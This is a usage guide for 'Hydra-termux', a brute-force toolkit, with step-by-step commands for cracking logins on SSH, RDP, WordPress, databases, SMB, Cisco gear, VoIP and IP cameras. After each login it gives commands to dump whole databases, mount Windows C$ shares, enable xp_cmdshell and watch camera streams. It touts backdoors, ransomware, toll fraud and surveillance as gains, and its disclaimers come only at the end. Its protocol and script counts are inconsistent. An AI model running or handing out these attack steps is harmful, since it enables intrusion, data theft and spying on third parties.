# Complete Protocol Attack Scripts Guide

## Overview
This document provides detailed explanations and instructions for all specialized attack scripts available in Hydra-termux, covering protocols beyond basic SSH/FTP/Web attacks.

---

## Table of Contents

### Basic Protocols (Original 12)
1. [SSH](#1-ssh-secure-shell)
2. [FTP](#2-ftp-file-transfer-protocol)
3. [HTTP/Web](#3-httpweb-attacks)
4. [RDP](#4-rdp-remote-desktop-protocol)
5. [MySQL](#5-mysql-database)
6. [PostgreSQL](#6-postgresql-database)
7. [SMB/CIFS](#7-smbcifs-windows-shares)
8. [Telnet](#8-telnet)
9. [VNC](#9-vnc-virtual-network-computing)
10. [SMTP](#10-smtp-simple-mail-transfer-protocol)
11. [POP3](#11-pop3-post-office-protocol)
12. [IMAP](#12-imap-internet-message-access-protocol)

### Advanced Protocols (Additional 10+)
13. [LDAP](#13-ldap-active-directory)
14. [MSSQL](#14-mssql-microsoft-sql-server)
15. [MongoDB](#15-mongodb-nosql-database)
16. [Redis](#16-redis-key-value-store)
17. [SNMP](#17-snmp-network-management)
18. [HTTP Basic Auth](#18-http-basic-authentication)
19. [HTTP Proxy Auth](#19-http-proxy-authentication)
20. [Cisco Devices](#20-cisco-routerswitches)
21. [Asterisk SIP/VoIP](#21-asterisk-sipvoip)
22. [Oracle Database](#22-oracle-database)
23. [RTSP IP Cameras](#23-rtsp-ip-camerassurveillance)

---

## Basic Protocols

### 1. SSH (Secure Shell)

**What it is**: Secure remote terminal access to servers

**Port**: 22 (default)

**Use Cases**:
- Server administration
- Remote command execution
- File transfer via SCP/SFTP

**Attack Script**: `scripts/ssh_quick.sh`

**Step-by-Step**:
```bash
# 1. Edit the target
nano scripts/ssh_quick.sh
# Change: TARGET="192.168.1.100"

# 2. Run
bash scripts/ssh_quick.sh

# 3. Result example:
# [+] SUCCESS! Username: root, Password: toor123
```

**What happens when successful**:
- Gain full shell access to the server
- Can execute any command
- Can read/write/delete files
- Can install backdoors

**Real-world pentesting use**:
- Initial access to Linux servers
- Lateral movement in networks
- Privilege escalation testing

---

### 2. FTP (File Transfer Protocol)

**What it is**: File sharing protocol

**Port**: 21 (default)

**Use Cases**:
- Website file uploads
- Backup transfers
- Legacy file sharing

**Attack Script**: `scripts/ftp_quick.sh`

**Step-by-Step**:
```bash
# 1. Edit
nano scripts/ftp_quick.sh
# Change: TARGET="ftp.example.com"

# 2. Run
bash scripts/ftp_quick.sh

# 3. Result:
# [+] SUCCESS! Username: ftpuser, Password: upload123
```

**What you get**:
- List all files on server
- Upload malicious files
- Download sensitive data
- Modify website content

**Pentest value**:
- Web defacement capability
- Data exfiltration
- Malware upload vector

---

### 3. HTTP/Web Attacks

**What it is**: Web admin panel/login attacks

**Port**: 80 (HTTP), 443 (HTTPS)

**Common Targets**:
- WordPress `/wp-admin`
- cPanel `/cpanel`
- PHPMyAdmin `/phpmyadmin`
- Custom admin panels

**Attack Scripts**:
- `scripts/web_quick.sh` - Generic web admin
- `scripts/wordpress_quick.sh` - WordPress specific
- `scripts/http_basic_auth.sh` - HTTP Basic Auth
- `scripts/web_directory_bruteforce.sh` - Find admin panels

**Step-by-Step (WordPress)**:
```bash
# 1. Edit
nano scripts/wordpress_quick.sh
# Change: TARGET="http://example.com"

# 2. Run
bash scripts/wordpress_quick.sh

# 3. Result:
# [+] SUCCESS! Username: admin, Password: Welcome123!
# [+] Login at: http://example.com/wp-admin
```

**What you control**:
- Create/edit posts and pages
- Upload malicious plugins
- Modify theme files (inject code)
- Create admin accounts
- Access database

**Pentest value**:
- Complete website compromise
- SEO poisoning attacks
- Phishing page injection
- Stored XSS attacks

---

### 4. RDP (Remote Desktop Protocol)

**What it is**: Windows remote desktop access

**Port**: 3389 (default)

**Use Cases**:
- Windows server management
- Remote work access
- IT support

**Attack Script**: `scripts/rdp_quick.sh`

**Step-by-Step**:
```bash
# 1. Edit
nano scripts/rdp_quick.sh
# Change: TARGET="192.168.1.50"

# 2. Run
bash scripts/rdp_quick.sh

# 3. Result:
# [+] SUCCESS! Username: Administrator, Password: P@ssw0rd
```

**What you get**:
- Full GUI desktop access
- Same as sitting at the computer
- Can run any program
- Access all files

**How to connect after success**:
```bash
# Linux
rdesktop 192.168.1.50 -u Administrator -p P@ssw0rd

# Windows
mstsc /v:192.168.1.50
```

**Pentest value**:
- Domain admin access
- Ransomware deployment vector
- Data exfiltration
- Privilege escalation

---

### 5. MySQL Database

**What it is**: Popular open-source database

**Port**: 3306 (default)

**Use Cases**:
- Website databases
- Application data storage
- User credential storage

**Attack Script**: `scripts/mysql_quick.sh`

**Step-by-Step**:
```bash
# 1. Edit
nano scripts/mysql_quick.sh
# Change: TARGET="192.168.1.100"

# 2. Run
bash scripts/mysql_quick.sh

# 3. Result:
# [+] SUCCESS! Username: root, Password: mysql123
```

**What you can do**:
```bash
# Connect
mysql -h 192.168.1.100 -u root -pmysql123

# Dump all data
mysqldump -h 192.168.1.100 -u root -pmysql123 --all-databases > dump.sql

# View databases
SHOW DATABASES;

# Access user data
USE wordpress;
SELECT user_login, user_pass FROM wp_users;
```

**Pentest value**:
- Dump user credentials (hashed)
- Steal customer data
- Modify application logic
- Create backdoor accounts

---

### 6. PostgreSQL Database

**What it is**: Advanced open-source database

**Port**: 5432 (default)

**Use Cases**:
- Enterprise applications
- Geographic data
- Complex queries

**Attack Script**: `scripts/postgres_quick.sh`

**Step-by-Step**:
```bash
# 1. Edit
nano scripts/postgres_quick.sh
# Change: TARGET="192.168.1.100"

# 2. Run
bash scripts/postgres_quick.sh

# 3. Result:
# [+] SUCCESS! Username: postgres, Password: admin123
```

**What you access**:
```bash
# Connect
psql -h 192.168.1.100 -U postgres

# List databases
\l

# Connect to database
\c database_name

# List tables
\dt

# Dump data
pg_dump -h 192.168.1.100 -U postgres database_name > dump.sql
```

**Pentest value**:
- Similar to MySQL
- Often contains business-critical data
- Can execute OS commands with appropriate permissions

---

### 7. SMB/CIFS (Windows Shares)

**What it is**: Windows file/printer sharing

**Port**: 445 (default), 139 (legacy)

**Use Cases**:
- Network file shares
- Shared printers
- Inter-computer communication

**Attack Script**: `scripts/smb_quick.sh`

**Step-by-Step**:
```bash
# 1. Edit
nano scripts/smb_quick.sh
# Change: TARGET="192.168.1.50"

# 2. Run
bash scripts/smb_quick.sh

# 3. Result:
# [+] SUCCESS! Username: Administrator, Password: admin123
```

**What you access**:
```bash
# List shares
smbclient -L //192.168.1.50 -U Administrator%admin123

# Access C drive
smbclient //192.168.1.50/C$ -U Administrator%admin123

# Mount share
mount -t cifs //192.168.1.50/C$ /mnt/share -o username=Administrator,password=admin123
```

**Pentest value**:
- Access confidential documents
- Modify shared files
- Plant malware
- Lateral movement via pass-the-hash

---

## Advanced Protocols

### 13. LDAP (Active Directory)

**What it is**: Directory service (user management)

**Port**: 389 (LDAP), 636 (LDAPS), 3268 (Global Catalog)

**Use Cases**:
- Windows Domain authentication
- Corporate user directories
- Single sign-on

**Attack Script**: `scripts/ldap_quick.sh`

**Why it matters**:
- Domain admin = entire network access
- User enumeration
- Password policy info
- Group membership

**Pentest value**:
- Domain compromise
- Privilege escalation
- Kerberoasting attacks

---

### 14. MSSQL (Microsoft SQL Server)

**What it is**: Microsoft's enterprise database

**Port**: 1433 (default)

**Use Cases**:
- Enterprise Windows applications
- SharePoint backends
- Financial systems

**Attack Script**: `scripts/mssql_quick.sh`

**Special features**:
- Can execute OS commands via `xp_cmdshell`
- Linked server attacks
- Credential dumping

**Command execution**:
```sql
-- Enable command execution
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

-- Run commands
EXEC xp_cmdshell 'whoami';
```

**Pentest value**:
- RCE (Remote Code Execution)
- Privilege escalation
- Lateral movement

---

### 15. MongoDB (NoSQL Database)

**What it is**: Document-oriented NoSQL database

**Port**: 27017 (default)

**Use Cases**:
- Modern web applications
- Big data storage
- Flexible schema data

**Attack Script**: `scripts/mongodb_quick.sh`

**Common issue**: Often misconfigured with no authentication

**Access**:
```bash
# Connect
mongo --host 192.168.1.100 -u admin -p password123

# List databases
show dbs

# Access data
use myapp
db.users.find()
```

**Pentest value**:
- User data extraction
- API key theft
- Session hijacking

---

### 16. Redis (Key-Value Store)

**What it is**: In-memory data structure store

**Port**: 6379 (default)

**Use Cases**:
- Session storage
- Caching
- Real-time analytics

**Attack Script**: `scripts/redis_quick.sh`

**Common vulnerability**: No auth by default

**What you get**:
- Session tokens (hijack sessions)
- Cached credentials
- API keys
- Temporary data

**Pentest value**:
- Session hijacking
- RCE via cron jobs
- Data theft

---

### 18. HTTP Basic Authentication

**What it is**: Simple HTTP auth (popup box)

**Port**: 80/443

**Use Cases**:
- Protected directories
- API endpoints
- Legacy systems

**Attack Script**: `scripts/http_basic_auth.sh`

**How to use**:
```bash
# 1. Edit target
nano scripts/http_basic_auth.sh
# Change: TARGET="http://example.com/admin"

# 2. Run attack
bash scripts/http_basic_auth.sh

# 3. Access with credentials
curl -u admin:password123 http://example.com/admin
```

**Pentest value**:
- Access restricted areas
- API exploitation
- Protected content access

---

### 19. HTTP Proxy Authentication

**What it is**: Corporate proxy servers requiring login

**Port**: 8080, 3128, 8888 (common)

**Use Cases**:
- Corporate internet access
- Content filtering
- Traffic monitoring

**Attack Script**: `scripts/http_proxy_auth.sh`

**Why attack it**:
- Bypass internet restrictions
- Anonymous browsing
- Access blocked sites

---

### 20. Cisco Routers/Switches

**What it is**: Network equipment enable password

**Port**: 23 (Telnet)

**Use Cases**:
- Router configuration
- Switch management
- Network control

**Attack Script**: `scripts/cisco_enable.sh`

**Step-by-Step**:
```bash
# 1. Edit
nano scripts/cisco_enable.sh
# Change: TARGET="192.168.1.1"

# 2. Run (LOW threads - Cisco is sensitive!)
bash scripts/cisco_enable.sh

# 3. Result:
# [+] SUCCESS! Enable password: cisco123

# 4. Connect
telnet 192.168.1.1
# Login, then:
enable
# Enter password: cisco123

# 5. Now you have full config access
```

**What you control**:
- Entire network routing
- VLAN configuration
- Port security
- Access control lists

**Pentest value**:
- Complete network compromise
- Traffic redirection
- MITM attacks
- Network denial of service

---

### 21. Asterisk SIP/VoIP

**What it is**: Phone system credentials

**Port**: 5060 (SIP)

**Use Cases**:
- Office phone systems
- Call centers
- VoIP communications

**Attack Script**: `scripts/asterisk_sip.sh`

**What you get**:
- Free phone calls
- Call interception
- Voicemail access
- Call recording

**How to use**:
```bash
# 1. Edit
nano scripts/asterisk_sip.sh
# Change: TARGET="192.168.1.100"

# 2. Run
bash scripts/asterisk_sip.sh

# 3. Result:
# [+] SUCCESS! Extension: 100, Password: 1234

# 4. Configure SIP client (Linphone, Zoiper)
# Server: 192.168.1.100
# Extension: 100
# Password: 1234
```

**Pentest value**:
- Toll fraud
- Eavesdropping
- Social engineering via caller ID spoofing

---

### 22. Oracle Database

**What it is**: Enterprise database system

**Port**: 1521 (TNS Listener)

**Use Cases**:
- Large enterprise systems
- Financial applications
- ERP systems (SAP, PeopleSoft)

**Attack Script**: `scripts/oracle_db.sh`

**Step-by-Step**:
```bash
# 1. Edit target and SID
nano scripts/oracle_db.sh
# Change: TARGET="192.168.1.100"
# Change: SID="ORCL"  # Or XE, PROD, etc.

# 2. Run (LOW threads!)
bash scripts/oracle_db.sh

# 3. Result:
# [+] SUCCESS! Username: system, Password: oracle123
# [+] Connect: sqlplus system/oracle123@192.168.1.100:1521/ORCL
```

**What you access**:
- Critical business data
- Financial records
- Customer information
- Application logic

**Pentest value**:
- High-value data theft
- Business disruption
- Privilege escalation

---

### 23. RTSP (IP Cameras/Surveillance)

**What it is**: Streaming protocol for cameras

**Port**: 554 (default)

**Use Cases**:
- IP security cameras
- DVR/NVR systems
- Surveillance networks

**Attack Script**: `scripts/rtsp_camera.sh`

**Step-by-Step**:
```bash
# 1. Edit
nano scripts/rtsp_camera.sh
# Change: TARGET="192.168.1.200"

# 2. Run
bash scripts/rtsp_camera.sh

# 3. Result:
# [+] SUCCESS! Username: admin, Password: 12345
# [+] Stream: rtsp://admin:12345@192.168.1.200:554/stream

# 4. View stream
vlc rtsp://admin:12345@192.168.1.200:554/stream

# Or with ffplay
ffplay rtsp://admin:12345@192.168.1.200:554/stream
```

**Common stream paths**:
- `/stream`
- `/live`
- `/h264`
- `/video`
- `/cam/realmonitor?channel=1&subtype=0`

**Pentest value**:
- Physical security bypass
- Surveillance of facilities
- Privacy violations
- Proof of physical access

---

## Protocol Combinations

### Combo Scripts Explained

#### 1. `combo_web_db.sh` - Web + Database
**Scenario**: Website with backend database

**What it does**:
1. Attacks web admin panel
2. If successful, connects to MySQL/PostgreSQL
3. Extracts database credentials from config files
4. Dumps entire database

**Use case**: Complete website compromise

---

#### 2. `combo_network_stack.sh` - SSH + FTP + MySQL + SMB
**Scenario**: Linux server with multiple services

**What it does**:
1. Attacks SSH first
2. Uses SSH to find FTP credentials
3. Attacks MySQL
4. Checks for SMB shares

**Use case**: Full server compromise with credential reuse

---

#### 3. `combo_windows_infra.sh` - RDP + SMB + MSSQL + LDAP
**Scenario**: Windows domain environment

**What it does**:
1. Attacks RDP for initial access
2. Uses RDP to access SMB shares
3. Finds MSSQL connection strings
4. Attacks LDAP for domain admin

**Use case**: Active Directory compromise

---

#### 4. `combo_mail_stack.sh` - SMTP + POP3 + IMAP + Webmail
**Scenario**: Mail server

**What it does**:
1. Tests SMTP (sending)
2. Tests POP3 (receiving)
3. Tests IMAP (folders)
4. Attacks webmail interface

**Use case**: Email server compromise

---

#### 5. `combo_db_cluster.sh` - All Databases
**Scenario**: Database server farm

**Attacks**: MySQL, PostgreSQL, MSSQL, MongoDB, Redis, Oracle

**Use case**: Data center database audit

---

#### 6. `combo_iot_devices.sh` - Telnet + SNMP + HTTP + FTP
**Scenario**: IoT devices, routers, cameras

**What it does**:
1. Attacks Telnet (default passwords)
2. Queries SNMP for info
3. Attacks HTTP admin panels
4. Tests FTP for firmware

**Use case**: IoT security assessment

---

#### 7. `combo_full_infrastructure.sh` - Everything
**Scenario**: Complete network penetration test

**Attacks ALL 16 protocols**:
- SSH, FTP, Telnet, SMTP, HTTP, POP3, IMAP, SMB, RDP
- MySQL, PostgreSQL, MSSQL, MongoDB, Redis, LDAP, VNC

**Use case**: Enterprise-wide security assessment

**Step-by-Step**:
```bash
# 1. Edit
nano scripts/combo_full_infrastructure.sh
# Change: TARGET="192.168.1.100"
# Or: TARGET="192.168.1.0/24"  # Entire subnet!

# 2. Run (this takes a while!)
bash scripts/combo_full_infrastructure.sh

# 3. Wait...
# [*] Testing SSH...
# [*] Testing FTP...
# [*] Testing Web...
# ... (all protocols)

# 4. View comprehensive results
bash scripts/results_viewer.sh --target 192.168.1.100
```

---

## Advanced Scanning Tools

### Nmap Integration Scripts

#### 1. `nmap_stealth_scan.sh` - SYN Scan
**What it does**: Stealthy port scanning (doesn't complete TCP handshake)
**Use**: Avoid detection by IDS/IPS

#### 2. `nmap_full_scan.sh` - All Ports + Service Detection
**What it does**: Scans all 65535 ports + identifies services
**Use**: Complete inventory

#### 3. `nmap_vuln_scan.sh` - Vulnerability Detection
**What it does**: Uses NSE scripts to find known vulnerabilities
**Use**: Find exploitable services

#### 4. `nmap_os_detection.sh` - Operating System Fingerprinting
**What it does**: Identifies OS and version
**Use**: Target selection

#### 5. `nmap_network_discovery.sh` - Host Discovery
**What it does**: Finds live hosts on network
**Use**: Network mapping

#### 6. `ssl_analyzer.sh` - SSL/TLS Testing
**What it does**: Tests SSL/TLS configuration
**Use**: Find weak crypto, expired certs

#### 7. `web_directory_bruteforce.sh` - Admin Panel Finder
**What it does**: Brute-forces common admin paths
**Use**: Find hidden admin panels

#### 8. `web_header_analyzer.sh` - HTTP Security Headers
**What it does**: Checks for security headers (HSTS, CSP, X-Frame-Options)
**Use**: Web security assessment

---

## Complete Workflow Examples

### Example 1: WordPress Site Takeover

```bash
# 1. Find admin panel
bash scripts/web_directory_bruteforce.sh
# Edit: TARGET="http://example.com"

# 2. Attack WordPress
bash scripts/wordpress_quick.sh
# Edit: TARGET="http://example.com"

# 3. Success! Login at /wp-admin

# 4. Find database credentials
# Login to WordPress admin
# Tools → Site Health → Info → Database

# 5. Attack database
bash scripts/mysql_quick.sh
# Edit: TARGET="db.example.com"

# 6. Dump all data
bash scripts/results_viewer.sh --protocol mysql
```

### Example 2: Corporate Network Pentest

```bash
# 1. Network discovery
bash scripts/nmap_network_discovery.sh
# Edit: TARGET="192.168.1.0/24"

# 2. Find live hosts (let's say 192.168.1.100)

# 3. Full port scan
bash scripts/nmap_full_scan.sh
# Edit: TARGET="192.168.1.100"

# 4. Vulnerability scan
bash scripts/nmap_vuln_scan.sh
# Edit: TARGET="192.168.1.100"

# 5. Attack all found services
bash scripts/combo_full_infrastructure.sh
# Edit: TARGET="192.168.1.100"

# 6. Review results
bash scripts/results_viewer.sh --target 192.168.1.100
```

### Example 3: Data Center Database Audit

```bash
# 1. Find database servers
bash scripts/nmap_full_scan.sh
# Edit: TARGET="10.0.0.0/24"
# Look for ports: 3306 (MySQL), 5432 (PostgreSQL), 1433 (MSSQL), 27017 (MongoDB)

# 2. Attack all databases
bash scripts/combo_db_cluster.sh
# Edit: TARGET="10.0.0.50"

# 3. Export all database credentials
bash scripts/results_viewer.sh --export db_creds.csv
```

---

## Troubleshooting Guide

### Problem: "VPN not detected"
**Solution**:
```bash
# Check VPN
bash scripts/vpn_check.sh

# Skip VPN (testing only!)
bash script.sh --skip-vpn
```

### Problem: "No results"
**Reasons**:
1. Account lockout (too many attempts)
2. Wrong port
3. Service not running
4. Firewall blocking

**Solutions**:
```bash
# Reduce threads
-T 4

# Verify service is running
nmap -p 22 192.168.1.100

# Try different port
-p 2222
```

### Problem: Script hangs
**Reason**: Large wordlist + many threads

**Solution**:
```bash
# Use smaller wordlist first
cp config/admin_passwords.txt /tmp/test.txt
head -100 /tmp/test.txt > /tmp/small.txt

# Edit script to use small wordlist
WORDLIST="/tmp/small.txt"
```

### Problem: "Hydra not found"
**Solution**:
```bash
bash install.sh
```

---

## Security Best Practices

### 1. Always Use VPN
```bash
# Before any attack
sudo openvpn --config vpn.ovpn &
bash scripts/vpn_check.sh
```

### 2. Get Written Authorization
- Document your permission
- Keep authorization letters
- Define scope clearly

### 3. Rate Limiting
```bash
# Use fewer threads for sensitive devices
-T 4  # Instead of -T 32
```

### 4. Log Everything
```bash
# Always check logs
bash scripts/results_viewer.sh
```

### 5. Report Responsibly
- Document findings
- Suggest fixes
- Give time to patch

---

## Legal Reminders

⚠️ **ONLY USE ON**:
- Your own systems
- Systems with written permission
- Legal pentest contracts

❌ **NEVER USE ON**:
- Systems without authorization
- Any unauthorized targets

**Legal consequences**:
- Federal charges (CFAA)
- Fines up to $250,000
- Prison time up to 10 years

---

## Quick Reference Table

| Protocol | Port | Script | Use Case |
|----------|------|--------|----------|
| SSH | 22 | `ssh_quick.sh` | Server access |
| FTP | 21 | `ftp_quick.sh` | File access |
| Web | 80/443 | `web_quick.sh` | Admin panels |
| RDP | 3389 | `rdp_quick.sh` | Windows desktop |
| MySQL | 3306 | `mysql_quick.sh` | Database |
| PostgreSQL | 5432 | `postgres_quick.sh` | Database |
| SMB | 445 | `smb_quick.sh` | Windows shares |
| Telnet | 23 | `telnet_quick.sh` | Legacy access |
| VNC | 5900 | `vnc_quick.sh` | Remote desktop |
| LDAP | 389 | `ldap_quick.sh` | Active Directory |
| MSSQL | 1433 | `mssql_quick.sh` | MS SQL Server |
| MongoDB | 27017 | `mongodb_quick.sh` | NoSQL DB |
| Oracle | 1521 | `oracle_db.sh` | Oracle DB |
| RTSP | 554 | `rtsp_camera.sh` | IP cameras |
| SIP | 5060 | `asterisk_sip.sh` | VoIP phones |
| Cisco | 23 | `cisco_enable.sh` | Network gear |

---

## All Scripts Summary

**Total**: 53 scripts covering 40+ protocols

**Categories**:
- Basic protocols: 12
- Advanced protocols: 11
- Combinations: 7
- Scanning tools: 9
- Utilities: 6
- Main launcher: 1
- Documentation: 7

**For complete list**: See `scripts/README_COMPLETE.md`

---

**Remember**: Use ethically, legally, and responsibly! 🛡️
